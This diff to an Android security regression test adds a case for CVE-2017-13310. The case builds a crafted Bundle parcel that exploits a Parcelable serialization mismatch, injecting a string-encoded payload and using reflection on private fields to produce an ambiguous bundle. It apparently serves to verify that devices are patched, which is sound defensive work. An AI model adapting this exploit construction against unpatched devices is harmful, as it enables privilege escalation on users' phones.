@@ -23,6 +23,9 @@ import android.os.BaseBundle;
 import android.os.Bundle;
 import android.os.Parcel;
 import android.os.Parcelable;
+import android.view.AbsSavedState;
+import android.view.View;
+import android.view.View.BaseSavedState;
 import android.annotation.SuppressLint;
 
 import java.io.InputStream;
@@ -35,14 +38,102 @@ import android.platform.test.annotations.SecurityTest;
 public class AmbiguousBundlesTest extends AndroidTestCase {
 
     /*
+     * b/71992105
+     */
+    @SecurityTest(minPatchLevel = "2018-05")
+    public void test_android_CVE_2017_13310() throws Exception {
+
+        Ambiguator ambiguator = new Ambiguator() {
+
+            {
+                parcelledDataField = BaseBundle.class.getDeclaredField("mParcelledData");
+                parcelledDataField.setAccessible(true);
+            }
+
+            @Override
+            public Bundle make(Bundle preReSerialize, Bundle postReSerialize) throws Exception {
+                Random random = new Random(1234);
+                int minHash = 0;
+                for (String s : preReSerialize.keySet()) {
+                    minHash = Math.min(minHash, s.hashCode());
+                }
+                for (String s : postReSerialize.keySet()) {
+                    minHash = Math.min(minHash, s.hashCode());
+                }
+
+                String key;
+                int keyHash;
+
+                do {
+                    key = randomString(random);
+                    keyHash = key.hashCode();
+                } while (keyHash >= minHash);
+
+                padBundle(postReSerialize, preReSerialize.size(), minHash, random);
+                padBundle(preReSerialize, postReSerialize.size(), minHash, random);
+
+                String key2;
+                int key2Hash;
+                do {
+                    key2 = makeStringToInject(random);
+                    key2Hash = key2.hashCode();
+                } while (key2Hash >= minHash || key2Hash <= keyHash);
+
+
+                Parcel parcel = Parcel.obtain();
+
+                parcel.writeInt(preReSerialize.size() + 2);
+                parcel.writeString(key);
+
+                parcel.writeInt(VAL_PARCELABLE);
+                parcel.writeString("com.android.internal.widget.ViewPager$SavedState");
+
+                (new View.BaseSavedState(AbsSavedState.EMPTY_STATE)).writeToParcel(parcel, 0);
+
+                parcel.writeString(key2);
+                parcel.writeInt(VAL_BUNDLE);
+                parcel.writeBundle(postReSerialize);
+
+                writeBundleSkippingHeaders(parcel, preReSerialize);
+
+                parcel.setDataPosition(0);
+                Bundle bundle = new Bundle();
+                parcelledDataField.set(bundle, parcel);
+                return bundle;
+            }
+
+            private String makeStringToInject(Random random) {
+                Parcel p = Parcel.obtain();
+                p.writeInt(VAL_INTARRAY);
+                p.writeInt(13);
+
+                for (int i = 0; i < VAL_INTARRAY / 2; i++) {
+                    int paddingVal;
+                    if(1 > 3) {
+                        paddingVal = 0x420041 + (i << 17) + (i << 1);
+                    } else {
+                        paddingVal = random.nextInt();
+                    }
+                    p.writeInt(paddingVal);
+                }
+
+                p.setDataPosition(0);
+                String result = p.readString();
+                p.recycle();
+                return result;
+            }
+        };
+
+        testAmbiguator(ambiguator);
+    }
+
+    /*
      * b/71508348
      */
     @SecurityTest(minPatchLevel = "2018-06")
     public void test_android_CVE_2018_9339() throws Exception {
 
         Ambiguator ambiguator = new Ambiguator() {
-
-            private final Field parcelledDataField;
 
             private static final String BASE_PARCELABLE = "android.telephony.CellInfo";
             private final Parcelable smallerParcelable;
@@ -412,7 +503,7 @@ public class AmbiguousBundlesTest extends AndroidTestCase {
         protected static final int BUNDLE_MAGIC = 0x4C444E42;
         protected static final int INNER_BUNDLE_PADDING = 1;
 
-        protected final Field parcelledDataField;
+        protected Field parcelledDataField;
 
         public Ambiguator() throws Exception {
             parcelledDataField = BaseBundle.class.getDeclaredField("mParcelledData");
